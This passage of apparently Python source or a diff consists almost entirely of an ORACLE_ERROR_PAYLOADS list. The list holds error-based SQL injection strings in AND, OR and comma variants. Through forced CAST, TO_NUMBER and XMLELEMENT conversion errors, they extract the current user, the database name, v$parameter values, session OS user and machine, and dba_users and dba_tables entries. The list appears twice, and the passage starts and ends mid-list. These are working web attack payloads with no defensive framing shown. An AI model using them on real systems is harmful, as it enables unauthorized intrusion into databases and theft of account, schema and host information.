AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', ' AND 1=(SELECT XMLATTRIBUTES(USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLATTRIBUTES(USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLATTRIBUTES(USER) FROM DUAL)-- -', ' ,(SELECT XMLATTRIBUTES(USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLATTRIBUTES(CURRENT_USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLATTRIBUTES(CURRENT_USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLATTRIBUTES(CURRENT_USER) FROM DUAL)-- -', ' ,(SELECT XMLATTRIBUTES(CURRENT_USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLATTRIBUTES(SYSDATE) FROM DUAL)-- -', "' AND 1=(SELECT XMLATTRIBUTES(SYSDATE) FROM DUAL)-- -", ' OR 1=(SELECT XMLATTRIBUTES(SYSDATE) FROM DUAL)-- -', ' ,(SELECT XMLATTRIBUTES(SYSDATE) FROM DUAL)-- -', ' AND 1=(SELECT XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=TO_NUMBER(USER)-- -', "' AND 1=TO_NUMBER(USER)-- -", ' OR 1=TO_NUMBER(USER)-- -', ' AND 1=TO_NUMBER(CURRENT_USER)-- -', "' AND 1=TO_NUMBER(CURRENT_USER)-- -", ' OR 1=TO_NUMBER(CURRENT_USER)-- -', ' AND 1=TO_NUMBER(SESSION_USER)-- -', "' AND 1=TO_NUMBER(SESSION_USER)-- -", ' OR 1=TO_NUMBER(SESSION_USER)-- -', ' AND 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -', ' AND 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -', "' AND 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -", ' OR 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -', ' AND 1=TO_NUMBER(USERENV(chr(99)))-- -', "' AND 1=TO_NUMBER(USERENV(chr(99)))-- -", ' OR 1=TO_NUMBER(USERENV(chr(99)))-- -', ' AND 1=TO_NUMBER(USERENV(chr(100)))-- -', "' AND 1=TO_NUMBER(USERENV(chr(100)))-- -", ' OR 1=TO_NUMBER(USERENV(chr(100)))-- -', ' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -"]
+ORACLE_ERROR_PAYLOADS = [' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT machine FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT column_name FROM dba_tab_columns WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT object_name FROM dba_objects WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(UID AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT 